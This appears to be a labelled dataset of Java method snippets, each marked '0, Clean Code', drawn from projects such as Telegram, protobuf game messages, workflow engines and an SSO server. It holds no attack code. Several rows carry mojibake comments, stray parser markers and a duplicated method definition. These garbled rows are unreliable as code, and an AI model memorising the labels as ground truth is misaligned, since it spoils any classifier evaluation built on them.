        sb.setSpan(new ImageSpan(drawable,DynamicDrawableSpan.ALIGN_CENTER),0,1,Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);
      }
 catch (      Exception e) {
      }
    }
 else     if (forumTopic.icon_emoji_id != 0) {
      sb.append("" "");
      AnimatedEmojiSpan span;
      sb.setSpan(span=new AnimatedEmojiSpan(forumTopic.icon_emoji_id,.95f,paint == null ? null : paint.getFontMetricsInt()),0,1,Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);
      span.top=true;
      span.cacheType=AnimatedEmojiDrawable.CACHE_TYPE_ALERT_PREVIEW_STATIC;
    }
 else {
      sb.append("" "");
      Drawable drawable=ForumUtilities.createTopicDrawable(forumTopic,isDialog);
      if (drawableToSet != null) {
        drawableToSet[0]=((CombinedDrawable)drawable).getBackgroundDrawable();
      }
      drawable.setBounds(0,0,(int)(drawable.getIntrinsicWidth() * 0.65f),(int)(drawable.getIntrinsicHeight() * 0.65f));
      if (drawable instanceof CombinedDrawable && ((CombinedDrawable)drawable).getIcon() instanceof LetterDrawable) {
        ((LetterDrawable)((CombinedDrawable)drawable).getIcon()).scale=.7f;
      }
      if (paint != null) {
        ColoredImageSpan imageSpan=new ColoredImageSpan(drawable);
        imageSpan.setSize((int)(Math.abs(paint.getFontMetrics().descent) + Math.abs(paint.getFontMetrics().ascent)));
        sb.setSpan(imageSpan,0,1,Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);
      }
 else {
        sb.setSpan(new ImageSpan(drawable),0,1,Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);
      }
    }
    if (!TextUtils.isEmpty(forumTopic.title)) {
      sb.append("" "");
      sb.append(forumTopic.title);
    }
  }
 else {
    return ""DELETED"";
  }
  return sb;
}",0,Clean Code
"@Override public int getId(){
  return (ID << 8) + WorldLevel;
}",0,Clean Code
"protected ListingOrMappingTypeNode(SourceSection sourceSection,@Nullable TypeNode keyTypeNode,TypeNode valueTypeNode){
  super(sourceSection);
  this.keyTypeNode=keyTypeNode;
  this.valueTypeNode=valueTypeNode;
  skipKeyTypeChecks=keyTypeNode == null || keyTypeNode.isNoopTypeCheck();
  skipValueTypeChecks=valueTypeNode.isNoopTypeCheck();
}
",0,Clean Code
"public static void isNull(Object object,String message){
  if (object != null) {
    throw new IllegalArgumentException(message);
  }
}
public static void isNull(Object object){
  isNull(object,""[Assertion failed] - the object argument must be null"");
}
",0,Clean Code
"@Override public CfAdLinksExample getExampleByQuery(CfAdLinksQuery cfAdLinksQuery){
  CfAdLinksExample cfAdLinksExample=new CfAdLinksExample();
  CfAdLinksExample.Criteria criteria=cfAdLinksExample.createCriteria();
  if (cfAdLinksQuery.getId() != null) {
    criteria.andIdEqualTo(cfAdLinksQuery.getId());
  }
  if (cfAdLinksQuery.getAdId() != null) {
    criteria.andAdIdEqualTo(cfAdLinksQuery.getAdId());
  }
  if (cfAdLinksQuery.getScenes() != null) {
    criteria.andScenesEqualTo(cfAdLinksQuery.getScenes());
  }
  if (cfAdLinksQuery.getPlatform() != null) {
    criteria.andPlatformEqualTo(cfAdLinksQuery.getPlatform());
  }
  if (cfAdLinksQuery.getCarrierId() != null) {
    criteria.andCarrierIdEqualTo(cfAdLinksQuery.getCarrierId());
  }
  if (cfAdLinksQuery.getCarrierIds() != null) {
    criteria.andCarrierIdIn(cfAdLinksQuery.getCarrierIds());
  }
  if (cfAdLinksQuery.getMinStartTime() != null) {
    criteria.andStartTimeGreaterThanOrEqualTo(cfAdLinksQuery.getMinStartTime());
  }
  if (cfAdLinksQuery.getMaxStartTime() != null) {
    criteria.andStartTimeLessThanOrEqualTo(cfAdLinksQuery.getMaxStartTime());
  }
  if (cfAdLinksQuery.getMinEndTime() != null) {
    criteria.andEndTimeGreaterThanOrEqualTo(cfAdLinksQuery.getMinEndTime());
  }
  if (cfAdLinksQuery.getMaxEndTime() != null) {
    criteria.andEndTimeLessThanOrEqualTo(cfAdLinksQuery.getMaxEndTime());
  }
  if (StringUtils.isNotEmpty(cfAdLinksQuery.getOrderBy())) {
    cfAdLinksExample.setOrderByClause(cfAdLinksQuery.getOrderBy());
  }
  if (cfAdLinksQuery.getPage() != null && cfAdLinksQuery.getSize() != null) {
    PageHelper.startPage(cfAdLinksQuery.getPage(),cfAdLinksQuery.getSize());
  }
  return cfAdLinksExample;
}
",0,Clean Code
"@PostMapping(value=""/sweep/requeue/{workflowId}"",produces=TEXT_PLAIN_VALUE) @Operation(summary=""Queue up all the running workflows for sweep"") public String requeueSweep(@PathVariable(""workflowId"") String workflowId){
  return adminService.requeueSweep(workflowId);
}
",0,Clean Code
"/** 
 * Storage init properties
 */
private void initProp(){
  Properties props=getProperties();
  String connectTimeoutInSecondsConf=props.getProperty(PROP_KEY_CONNECT_TIMEOUT_IN_SECONDS);
  String networkTimeoutInSecondsConf=props.getProperty(PROP_KEY_NETWORK_TIMEOUT_IN_SECONDS);
  String charsetConf=props.getProperty(PROP_KEY_CHARSET);
  String httpAntiStealTokenConf=props.getProperty(PROP_KEY_HTTP_ANTI_STEAL_TOKEN);
  String httpSecretKeyConf=props.getProperty(PROP_KEY_HTTP_SECRET_KEY);
  String httpTrackerHttpPortConf=props.getProperty(PROP_KEY_HTTP_TRACKER_HTTP_PORT);
  String poolEnabled=props.getProperty(PROP_KEY_CONNECTION_POOL_ENABLED);
  String poolMaxCountPerEntry=props.getProperty(PROP_KEY_CONNECTION_POOL_MAX_COUNT_PER_ENTRY);
  String poolMaxIdleTime=props.getProperty(PROP_KEY_CONNECTION_POOL_MAX_IDLE_TIME);
  String poolMaxWaitTimeInMS=props.getProperty(PROP_KEY_CONNECTION_POOL_MAX_WAIT_TIME_IN_MS);
  if (connectTimeoutInSecondsConf != null && !connectTimeoutInSecondsConf.trim().isEmpty()) {
    ClientGlobal.g_connect_timeout=Integer.parseInt(connectTimeoutInSecondsConf.trim()) * 1000;
  }
  if (networkTimeoutInSecondsConf != null && !networkTimeoutInSecondsConf.trim().isEmpty()) {
    ClientGlobal.g_network_timeout=Integer.parseInt(networkTimeoutInSecondsConf.trim()) * 1000;
  }
  if (charsetConf != null && !charsetConf.trim().isEmpty()) {
    ClientGlobal.g_charset=charsetConf.trim();
  }
  if (httpAntiStealTokenConf != null && !httpAntiStealTokenConf.trim().isEmpty()) {
    ClientGlobal.g_anti_steal_token=Boolean.parseBoolean(httpAntiStealTokenConf);
  }
  if (httpSecretKeyConf != null && !httpSecretKeyConf.trim().isEmpty()) {
    ClientGlobal.g_secret_key=httpSecretKeyConf.trim();
  }
  if (httpTrackerHttpPortConf != null && !httpTrackerHttpPortConf.trim().isEmpty()) {
    ClientGlobal.g_tracker_http_port=Integer.parseInt(httpTrackerHttpPortConf);
  }
  if (poolEnabled != null && !poolEnabled.trim().isEmpty()) {
    ClientGlobal.g_connection_pool_enabled=Boolean.parseBoolean(poolEnabled);
  }
  if (poolMaxCountPerEntry != null && !poolMaxCountPerEntry.trim().isEmpty()) {
    ClientGlobal.g_connection_pool_max_count_per_entry=Integer.parseInt(poolMaxCountPerEntry);
  }
  if (poolMaxIdleTime != null && !poolMaxIdleTime.trim().isEmpty()) {
    ClientGlobal.g_connection_pool_max_idle_time=Integer.parseInt(poolMaxIdleTime) * 1000;
  }
  if (poolMaxWaitTimeInMS != null && !poolMaxWaitTimeInMS.trim().isEmpty()) {
    ClientGlobal.g_connection_pool_max_wait_time_in_ms=Integer.parseInt(poolMaxWaitTimeInMS);
  }
}",0,Clean Code
"@Override public String toString(){
  return ""MyBean{"" + ""age="" + age + '}';
}
",0,Clean Code
"/** 
 * <code>optional .ItemCostList roll_buffs_cost = 14;</code>
 * @return this
 */
public RogueCommonBuffSelectInfo clearRollBuffsCost(){
  bitField0_&=~0x00000100;
  rollBuffsCost.clear();
  return this;
}",0,Clean Code
"public final Object convert(ResultSetMetaData metaData,ResultSet rs,int columnIndex,String encoding) throws Exception {
  int columnType=metaData.getColumnType(columnIndex);
  String columnName=metaData.getColumnName(columnIndex);
  String columnTypeName=metaData.getColumnTypeName(columnIndex);
  Object value=extract(rs,metaData,columnIndex,columnType,columnTypeName,columnName,encoding);
  LOG.debug(""value: {}"",value);
  return convert(value,columnType,columnName,columnTypeName);
}
!org.eclipse.jdt.core.dom.MethodDeclaration@6befca7c",0,Clean Code
"private void readCommand(Command command) throws IOException {
  if (command != null) {
    while (!mClosed) {
      String line=mIn.readLine();
      if (line == null || mClosed) {
        break;
      }
      int pos=line.indexOf(TOKEN);
      if (pos > 0) {
        command.onUpdate(command.getID(),line.substring(0,pos));
      }
      if (pos >= 0) {
        line=line.substring(pos);
        String[] fields=line.split("" "");
        if (fields.length >= 2 && fields[1] != null) {
          int id=0;
          try {
            id=Integer.parseInt(fields[1]);
          }
 catch (          NumberFormatException ignored) {
          }
          int exitCode=-1;
          try {
            exitCode=Integer.parseInt(fields[2]);
          }
 catch (          NumberFormatException ignored) {
          }
          if (id == command.getID()) {
            command.setExitCode(exitCode);
            break;
          }
        }
      }
      command.onUpdate(command.getID(),line);
    }
  }
}",0,Clean Code
"public static Lookup _trustedLookup(Class<?> objectClass){
  if (GraalvmSupport.isGraalBuildtime()) {
    return _Lookup._trustedLookup(objectClass);
  }
  return lookupCache.get(objectClass);
}
",0,Clean Code
"public String toString(){
  return ""CommentForRead{id="" + this.id + "",postUser=""+ this.postUser+ "",createTime=""+ this.createTime+ "",content=""+ this.content+ "",replyCount=""+ this.replyCount+ "",vecReply=""+ this.vecReply+ "",likeInfo=""+ this.likeInfo+ "",richContents=""+ this.richContents+ "",sequence=""+ this.sequence+ "",}"";
}
",0,Clean Code
"@Override public AvatarExpUpScRsp clear(){
  if (isEmpty()) {
    return this;
  }
  cachedSize=-1;
  bitField0_=0;
  retcode=0;
  returnItemList.clear();
  return this;
}",0,Clean Code
"@Override public void write(MemoryBuffer buffer,ZoneId obj){
  fury.writeString(buffer,obj.getId());
}
",0,Clean Code
"@Override public EnhanceRogueBuffCsReq mergeFrom(final EnhanceRogueBuffCsReq other){
  if (other.isEmpty()) {
    return this;
  }
  cachedSize=-1;
  if (other.hasBuffId()) {
    setBuffId(other.buffId);
  }
  return this;
}
!org.eclipse.jdt.core.dom.MethodDeclaration@71617386!org.eclipse.jdt.core.dom.MethodDeclaration@5c6041",0,Clean Code
"public MistralAiChatModelBuilder responseFormat(String responseFormat){
  this.responseFormat=responseFormat;
  return this;
}
public MistralAiChatModelBuilder responseFormat(MistralAiResponseFormatType responseFormat){
  this.responseFormat=responseFormat.toString();
  return this;
}
",0,Clean Code
String getA2(String uin);,0,Clean Code
"@Override public void run(SourceContext<T> ctx) throws Exception {
  Instant lastConsumeInstant=Instant.now();
  while (running) {
    ConsumerResult consumeResult=messagePullConsumer.getMessage();
    if (!consumeResult.isSuccess()) {
      if (!(consumeResult.getErrCode() == 400 || consumeResult.getErrCode() == 404 || consumeResult.getErrCode() == 405 || consumeResult.getErrCode() == 406 || consumeResult.getErrCode() == 407 || consumeResult.getErrCode() == 408)) {
        LOG.info(""Could not consume messages from tubemq (errcode: {}, "" + ""errmsg: {})."",consumeResult.getErrCode(),consumeResult.getErrMsg());
      }
      Duration idleTime=Duration.between(lastConsumeInstant,Instant.now());
      if (idleTime.compareTo(maxIdleTime) > 0) {
        ctx.markAsTemporarilyIdle();
      }
      continue;
    }
    List<Message> messageList=consumeResult.getMessageList();
    List<T> records=new ArrayList<>();
    if (messageList != null) {
      lastConsumeInstant=Instant.now();
      for (      Message message : messageList) {
        T record=deserializationSchema.deserialize(message.getData());
        records.add(record);
      }
    }
synchronized (ctx.getCheckpointLock()) {
      for (      T record : records) {
        ctx.collect(record);
      }
      currentOffsets.put(consumeResult.getPartitionKey(),consumeResult.getCurrOffset());
    }
    ConsumerResult confirmResult=messagePullConsumer.confirmConsume(consumeResult.getConfirmContext(),true);
    if (!confirmResult.isSuccess()) {
      if (!(confirmResult.getErrCode() == 400 || confirmResult.getErrCode() == 404 || confirmResult.getErrCode() == 405 || confirmResult.getErrCode() == 406 || confirmResult.getErrCode() == 407 || confirmResult.getErrCode() == 408)) {
        LOG.warn(""Could not confirm messages to tubemq (errcode: {}, "" + ""errmsg: {})."",confirmResult.getErrCode(),confirmResult.getErrMsg());
      }
    }
  }
}",0,Clean Code
"public int getPerLoadingMaterialType(){
  return this.perLoadingMaterialType;
}
",0,Clean Code
"public static EnhanceRogueBuffCsReq parseFrom(final byte[] data) throws InvalidProtocolBufferException {
  return ProtoMessage.mergeFrom(new EnhanceRogueBuffCsReq(),data).checkInitialized();
}
public static EnhanceRogueBuffCsReq parseFrom(final ProtoSource input) throws IOException {
  return ProtoMessage.mergeFrom(new EnhanceRogueBuffCsReq(),input).checkInitialized();
}
public static EnhanceRogueBuffCsReq parseFrom(final JsonSource input) throws IOException {
  return ProtoMessage.mergeFrom(new EnhanceRogueBuffCsReq(),input).checkInitialized();
}
",0,Clean Code
"/** 
 * 绛旀鏍￠獙
 * @param project
 * @param request
 */
private void validateAnswer(ProjectView project,AnswerRequest request){
  List<SurveySchema> uniqueSchemaList=SchemaHelper.findSchemaListByAttribute(project.getSurvey(),""unique"",true);
  SchemaHelper.TreeNode treeNode=SchemaHelper.SurveySchema2TreeNode(project.getSurvey());
  uniqueSchemaList.forEach(optionSchema -> {
    String questionId=treeNode.getTreeNodeMap().get(optionSchema.getId()).getParent().getData().getId();
    Object questionValue=request.getAnswer().get(questionId);
    if (questionValue == null) {
      return;
    }
    String uniqueQuery=String.format(""\""%s\"":"",optionSchema.getId());
    if (SurveySchema.DataType.number == optionSchema.getAttribute().getDataType()) {
      uniqueQuery+=((Map)questionValue).get(optionSchema.getId());
    }
 else {
      uniqueQuery+=""\"""" + ((Map)questionValue).get(optionSchema.getId()) + ""\"""";
    }
    AnswerQuery query=new AnswerQuery();
    query.setProjectId(project.getId());
    query.setValueQuery(uniqueQuery);
    if (answerService.count(query) > 0) {
      String uniqueText=optionSchema.getAttribute().getUniqueText();
      throw new ValidationException(isNotBlank(uniqueText) ? uniqueText : ""闂嵎閲嶅淇濆瓨"");
    }
  }
);
  List<SurveySchema> hasQuotaSchemaList=SchemaHelper.findSchemaHasAttribute(project.getSurvey(),""quota"");
  if (hasQuotaSchemaList.size() > 0) {
    ProjectQuery query=new ProjectQuery();
    query.setId(request.getProjectId());
    PublicStatisticsView statisticsView=statProject(query);
    hasQuotaSchemaList.forEach(optionSchema -> {
      String questionId=treeNode.getTreeNodeMap().get(optionSchema.getId()).getParent().getData().getId();
      Object questionValue=request.getAnswer().get(questionId);
      if (questionValue == null) {
        return;
      }
      boolean optionNotChecked=((Map)questionValue).get(optionSchema.getId()) == null;
      if (optionNotChecked) {
        return;
      }
      PublicStatisticsView.QuestionStatistics questionStatistics=statisticsView.getQuestionStatistics().get(questionId);
      int optionSelectedCount=questionStatistics.getOptionStatistics().stream().filter(x -> x.getOptionId().equals(optionSchema.getId())).findFirst().orElse(new PublicStatisticsView.OptionStatistics()).getCount();
      Integer quota=optionSchema.getAttribute().getQuota();
      if (quota != null && optionSelectedCount + 1 > quota) {
        throw new ValidationException(""閫夐」鏁伴噺瓒呰繃闄愬埗锛岃閲嶆柊閫夋嫨"");
      }
    }
);
  }
}",0,Clean Code
"@Override public boolean equals(Object o){
  if (o == this) {
    return true;
  }
  if (!(o instanceof SearchPlayerCsReq)) {
    return false;
  }
  SearchPlayerCsReq other=(SearchPlayerCsReq)o;
  return bitField0_ == other.bitField0_ && (!hasSearchUidList() || searchUidList.equals(other.searchUidList));
}",0,Clean Code
"@Override public void onClick(View v){
switch (v.getId()) {
case android.R.id.button1:
{
      if (mOnCheckedListener != null && mAdapter != null) {
        mOnCheckedListener.onChecked(mAdapter.getCheckedArray());
      }
    }
case android.R.id.button2:
{
    if (mData != null) {
      if (curWillCheckAll) {
        selectAll();
      }
 else {
        reverseSelect();
      }
      ((Button)v).setText(curWillCheckAll ? getResources().getString(R.string.miuix_appcompat_action_mode_inverse) : getResources().getString(R.string.miuix_appcompat_action_mode_select_all));
      curWillCheckAll=!curWillCheckAll;
    }
  }
}
}",0,Clean Code
"List<IGProIdentityInfo> getIdentityList();
",0,Clean Code
"private void buildParameter(PreparedStatement preparedStatement,Object parameter,Map<Integer,String> parameterMap) throws SQLException, IllegalAccessException {
  int size=parameterMap.size();
  if (parameter instanceof Long) {
    for (int i=1; i <= size; i++) {
      preparedStatement.setLong(i,Long.parseLong(parameter.toString()));
    }
    return;
  }
  if (parameter instanceof Integer) {
    for (int i=1; i <= size; i++) {
      preparedStatement.setInt(i,Integer.parseInt(parameter.toString()));
    }
    return;
  }
  if (parameter instanceof String) {
    for (int i=1; i <= size; i++) {
      preparedStatement.setString(i,parameter.toString());
    }
    return;
  }
  Map<String,Object> fieldMap=new HashMap<>();
  Field[] declaredFields=parameter.getClass().getDeclaredFields();
  for (  Field field : declaredFields) {
    String name=field.getName();
    field.setAccessible(true);
    Object obj=field.get(parameter);
    field.setAccessible(false);
    fieldMap.put(name,obj);
  }
  for (int i=1; i <= size; i++) {
    String parameterDefine=parameterMap.get(i);
    Object obj=fieldMap.get(parameterDefine);
    if (obj instanceof Short) {
      preparedStatement.setShort(i,Short.parseShort(obj.toString()));
      continue;
    }
    if (obj instanceof Integer) {
      preparedStatement.setInt(i,Integer.parseInt(obj.toString()));
      continue;
    }
    if (obj instanceof Long) {
      preparedStatement.setLong(i,Long.parseLong(obj.toString()));
      continue;
    }
    if (obj instanceof String) {
      preparedStatement.setString(i,obj.toString());
      continue;
    }
    if (obj instanceof Date) {
      preparedStatement.setDate(i,(java.sql.Date)obj);
    }
  }
}",0,Clean Code
"/** 
 * 鏌ヨ鍙傛暟閰嶇疆淇℃伅
 * @param config 鍙傛暟閰嶇疆淇℃伅
 * @return 鍙傛暟閰嶇疆淇℃伅
 */
default SysConfigEntity selectConfig(SysConfigEntity config){
  return selectOne(new LambdaQueryWrapperX<SysConfigEntity>().eq(ObjectUtil.isNotEmpty(config.getConfigId()),SysConfigEntity::getConfigId,config.getConfigId()).eq(ObjectUtil.isNotEmpty(config.getConfigName()),SysConfigEntity::getConfigName,config.getConfigName()).eq(ObjectUtil.isNotEmpty(config.getConfigKey()),SysConfigEntity::getConfigKey,config.getConfigKey()));
}
",0,Clean Code
"public XzException400HTTP(String message){
  super(RCode.BAD_REQUEST.getCode(),message);
}",0,Clean Code
"IGProRoleManagementTag getRoleManagementTag();
",0,Clean Code
"/** 
 * @return the value
 */
public ConstValue getValue(){
  return value;
}
",0,Clean Code
"@ParameterizedTest @MethodSource(""contentRetrieverProviders"") void should_answer_query_2(Function<DataSource,ContentRetriever> contentRetrieverProvider){
  ContentRetriever contentRetriever=contentRetrieverProvider.apply(dataSource);
  List<Content> retrieved=contentRetriever.retrieve(Query.from(""What is the total sales in dollars for each product?""));
  assertThat(retrieved).hasSize(1);
  assertThat(retrieved.get(0).textSegment().text()).contains(""SELECT"").contains(""99.98"",""71.97"",""64.95"",""22.50"",""23.97"");
}",0,Clean Code
"/** 
 * <code>optional uint32 group_id = 10;</code>
 * @param value the groupId to set
 * @return this
 */
public UnlockedMusic setGroupId(final int value){
  bitField0_|=0x00000002;
  groupId=value;
  return this;
}",0,Clean Code
"/** 
 * <code>optional .RogueRecordInfo record_info = 5;</code> This method returns the internal storage object without modifying any has state. The returned object should not be modified and be treated as read-only. Use  {@link #getMutableRecordInfo()} if you want to modify it.
 * @return internal storage object for reading
 */
public RogueRecordInfoOuterClass.RogueRecordInfo getRecordInfo(){
  return recordInfo;
}",0,Clean Code
"@Override public void employeeChangeRecords(Long companyId){
}
",0,Clean Code
"/** 
 * SSO-Server绔細鎺堟潈鍦板潃
 * @return 澶勭悊缁撴灉
 */
public Object ssoAuth(){
  SaRequest req=SaHolder.getRequest();
  SaResponse res=SaHolder.getResponse();
  SaSsoServerConfig cfg=ssoServerTemplate.getServerConfig();
  StpLogic stpLogic=ssoServerTemplate.getStpLogic();
  ParamName paramName=ssoServerTemplate.paramName;
  if (!stpLogic.isLogin()) {
    return cfg.notLoginView.get();
  }
  String mode=req.getParam(paramName.mode,"""");
  String redirect=req.getParam(paramName.redirect);
  if (mode.equals(SaSsoConsts.MODE_SIMPLE)) {
    if (SaFoxUtil.isEmpty(redirect)) {
      if (SaFoxUtil.isEmpty(cfg.getHomeRoute())) {
        throw new SaSsoException(""鏈寚瀹� redirect 鍙傛暟锛屼篃鏈厤缃� homeRoute 璺敱锛屾棤娉曞畬鎴愰噸瀹氬悜鎿嶄綔"").setCode(SaSsoErrorCode.CODE_30014);
      }
      return res.redirect(cfg.getHomeRoute());
    }
    ssoServerTemplate.checkRedirectUrl(redirect);
    return res.redirect(redirect);
  }
 else {
    String client=req.getParam(paramName.client);
    if (SaSsoConsts.CLIENT_WILDCARD.equals(client)) {
      throw new SaSsoException(""鏃犳晥 client 鏍囪瘑锛�"" + client).setCode(SaSsoErrorCode.CODE_30013);
    }
    if (SaFoxUtil.isEmpty(redirect)) {
      if (SaFoxUtil.isEmpty(cfg.getHomeRoute())) {
        throw new SaSsoException(""鏈寚瀹� redirect 鍙傛暟锛屼篃鏈厤缃� homeRoute 璺敱锛屾棤娉曞畬鎴愰噸瀹氬悜鎿嶄綔"").setCode(SaSsoErrorCode.CODE_30014);
      }
      return res.redirect(cfg.getHomeRoute());
    }
    String redirectUrl=ssoServerTemplate.buildRedirectUrl(stpLogic.getLoginId(),client,redirect);
    if (cfg.getAutoRenewTimeout()) {
      stpLogic.renewTimeout(stpLogic.getConfigOrGlobal().getTimeout());
    }
    return res.redirect(redirectUrl);
  }
}",0,Clean Code
"long getStateType();
",0,Clean Code
"public static void scale(VectorFloat<?> vector,float multiplier){
  impl.scale(vector,multiplier);
}
",0,Clean Code
"public Object longsCopyUnaligned(MemoryState state){
  state.heapBuffer.writerIndex(0);
  state.heapBuffer.writeBoolean(false);
  state.heapBuffer.writePrimitiveArrayWithSize(state.longs,Platform.LONG_ARRAY_OFFSET,state.longs.length * 8);
  return state.heapBuffer;
}",0,Clean Code
"@Override public void setApplicationContext(ApplicationContext applicationContext) throws BeansException {
  ApplicationContextUtil.applicationContext=applicationContext;
}
",0,Clean Code
"@Override protected int computeSerializedSize(){
  int size=0;
  if ((bitField0_ & 0x00000001) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(baseAvatarId);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(equipAvatarId);
  }
  return size;
}",0,Clean Code
"/** 
 * <code>repeated .RogueHandbookEvent rogue_event = 12;</code> This method returns the internal storage object without modifying any has state. The returned object should not be modified and be treated as read-only. Use  {@link #getMutableRogueEvent()} if you want to modify it.
 * @return internal storage object for reading
 */
public RepeatedMessage<RogueHandbookEventOuterClass.RogueHandbookEvent> getRogueEvent(){
  return rogueEvent;
}",0,Clean Code
"@Override public TakeOffEquipmentCsReq copyFrom(final TakeOffEquipmentCsReq other){
  cachedSize=other.cachedSize;
  if ((bitField0_ | other.bitField0_) != 0) {
    bitField0_=other.bitField0_;
    baseAvatarId=other.baseAvatarId;
    equipAvatarId=other.equipAvatarId;
  }
  return this;
}",0,Clean Code
"private LibLinearModelProto(com.google.protobuf.GeneratedMessageV3.Builder<?> builder){
  super(builder);
}
private LibLinearModelProto(){
  models_=java.util.Collections.emptyList();
}
!org.eclipse.jdt.core.dom.MethodDeclaration@d117bdc",0,Clean Code
"public void setBinExportPath(final String path,final ESide side){
  if (side == ESide.PRIMARY) {
    primaryBinExport=path;
  }
 else {
    secondaryBinExport=path;
  }
}
",0,Clean Code
"@Override public HeroBasicTypeInfo create(){
  return HeroBasicTypeInfo.newInstance();
}
",0,Clean Code
"/** 
 * @return the updateTime
 */
public String getUpdateTime(){
  return updateTime;
}
",0,Clean Code
"public void release(){
  Log.d(TAG,""release"");
  INSTANCE_CACHE=null;
  if (mImageAcquireLooper != null) {
    mImageAcquireLooper.quit();
  }
  if (mMediaProjection != null) {
    mMediaProjection.stop();
  }
  if (mVirtualDisplay != null) {
    mVirtualDisplay.release();
  }
  if (mImageReader != null) {
    mImageReader.close();
  }
  if (mUnderUsingImage != null) {
    mUnderUsingImage.close();
  }
  Image cachedImage=mCachedImage.getAndSet(null);
  if (cachedImage != null) {
    cachedImage.close();
  }
  if (mOrientationEventListener != null) {
    mOrientationEventListener.disable();
  }
  ScreenCapturerForegroundService.stop(mContext);
}
public void release(ScriptRuntime scriptRuntime){
  removeScriptRuntimeIfNeeded(scriptRuntime);
  if (mScriptRuntimes.isEmpty()) {
    release();
  }
}
",0,Clean Code
"/** 
 * <code>optional int64 modify_time = 14;</code>
 * @return the modifyTime
 */
public long getModifyTime(){
  return modifyTime;
}",0,Clean Code
"@Override public boolean success(){
  return success;
}
@Override public void success(boolean success){
  this.success=success;
}
",0,Clean Code
"/** 
 * See the general contract of the <code>readUTF</code> method of <code>DataInput</code>. <p> Bytes for this operation are read from the contained input stream.
 * @return     a Unicode string.
 * @exception EOFException  if this input stream reaches the end beforereading all the bytes.
 * @exception IOException   the stream has been closed and the containedinput stream does not support reading after close, or another I/O error occurs.
 * @exception UTFDataFormatException if the bytes do not represent a validmodified UTF-8 encoding of a string.
 * @see java.io.DataInputStream#readUTF(java.io.DataInput)
 */
public final String readUTF() throws IOException {
  return readUTF(this);
}
!org.eclipse.jdt.core.dom.MethodDeclaration@4a7fd0c9",0,Clean Code
"@Test public void getWorkflows(){
  Workflow workflow=new Workflow();
  workflow.setCorrelationId(""123"");
  ArrayList<Workflow> listOfWorkflows=new ArrayList<>(){
{
      add(workflow);
    }
  }
;
  when(mockWorkflowService.getWorkflows(anyString(),anyString(),anyBoolean(),anyBoolean())).thenReturn(listOfWorkflows);
  assertEquals(listOfWorkflows,workflowResource.getWorkflows(""test1"",""123"",true,true));
}",0,Clean Code
"@Test public void testIndexExistingTask() throws SQLException {
  TaskSummary ts=getMockTaskSummary(""task-id"");
  indexDAO.indexTask(ts);
  compareTaskSummary(ts);
  ts.setStatus(Task.Status.FAILED);
  indexDAO.indexTask(ts);
  compareTaskSummary(ts);
}
",0,Clean Code
"@Override public String getGuildId(){
  return this.mInfo.getGuildId();
}
",0,Clean Code
"@Override public Object executeGeneric(VirtualFrame frame){
  return evaluateCondition(frame) ? thenNode.executeGeneric(frame) : elseNode.executeGeneric(frame);
}
",0,Clean Code
"private static List<String> extractListInputParam(String key,List<?> values,String taskName,WorkflowDef workflow){
  ArrayList<String> errorList=new ArrayList<>();
  for (  Object listVal : values) {
    if (listVal instanceof String) {
      errorList.addAll(extractParamPathComponentsFromString(key,listVal.toString(),taskName,workflow));
    }
 else     if (listVal instanceof Map) {
      errorList.addAll(validateInputParam((Map<String,Object>)listVal,taskName,workflow));
    }
 else     if (listVal instanceof List) {
      errorList.addAll(extractListInputParam(key,(List<?>)listVal,taskName,workflow));
    }
  }
  return errorList;
}
",0,Clean Code
"void onResult(int i2,String str,VideoPlayUrlResult videoPlayUrlResult);",0,Clean Code
"public List<PollData> getTaskPollData(String taskName){
  return pollDataDAO.getPollData(taskName);
}
",0,Clean Code
"/** 
 * <code>optional .ChessRogueMiracleData miracle_data = 13;</code> This method returns the internal storage object without modifying any has state. The returned object should not be modified and be treated as read-only. Use  {@link #getMutableMiracleData()} if you want to modify it.
 * @return internal storage object for reading
 */
public ChessRogueMiracleDataOuterClass.ChessRogueMiracleData getMiracleData(){
  return miracleData;
}",0,Clean Code
"void regenerate();
",0,Clean Code
"public String get(String key){
  return parent + ""."" + key+ ""}"";
}
public String get(String key,int index){
  return parent + ""."" + key+ ""[""+ index+ ""]}"";
}
public String get(int index){
  return parent + ""["" + index+ ""]}"";
}
public String get(String key){
  return ""${"" + name + "".""+ field+ "".""+ key+ ""}"";
}
",0,Clean Code
"public void processUpdate(ConnectionUpdate update){
  if ((update.update_type & ConnectionUpdate.UPDATE_STATS) != 0) {
    sent_bytes=update.sent_bytes;
    rcvd_bytes=update.rcvd_bytes;
    sent_pkts=update.sent_pkts;
    rcvd_pkts=update.rcvd_pkts;
    blocked_pkts=update.blocked_pkts;
    status=(update.status & 0x00FF);
    port_mapping_applied=(update.status & 0x2000) != 0;
    decryption_ignored=(update.status & 0x1000) != 0;
    netd_block_missed=(update.status & 0x0800) != 0;
    is_blocked=(update.status & 0x0400) != 0;
    blacklisted_host=(update.status & 0x0200) != 0;
    blacklisted_ip=(update.status & 0x0100) != 0;
    last_seen=update.last_seen;
    tcp_flags=update.tcp_flags;
    if ((status == ConnectionDescriptor.CONN_STATUS_CLOSED) && (decryption_error != null))     status=ConnectionDescriptor.CONN_STATUS_CLIENT_ERROR;
    if (!mitm_decrypt)     payload_length=update.payload_length;
  }
  if ((update.update_type & ConnectionUpdate.UPDATE_INFO) != 0) {
    info=update.info;
    url=update.url;
    l7proto=update.l7proto;
    encrypted_l7=((update.info_flags & ConnectionUpdate.UPDATE_INFO_FLAG_ENCRYPTED_L7) != 0);
  }
  if ((update.update_type & ConnectionUpdate.UPDATE_PAYLOAD) != 0) {
    assert (decryption_ignored || isNotDecryptable());
    if (!CaptureService.isLowMemory()) {
synchronized (this) {
        if (update.payload_chunks != null)         payload_chunks.addAll(update.payload_chunks);
        payload_truncated=update.payload_truncated;
      }
    }
  }
}",0,Clean Code
"@Override public BattleEquipment create(){
  return BattleEquipment.newInstance();
}
",0,Clean Code
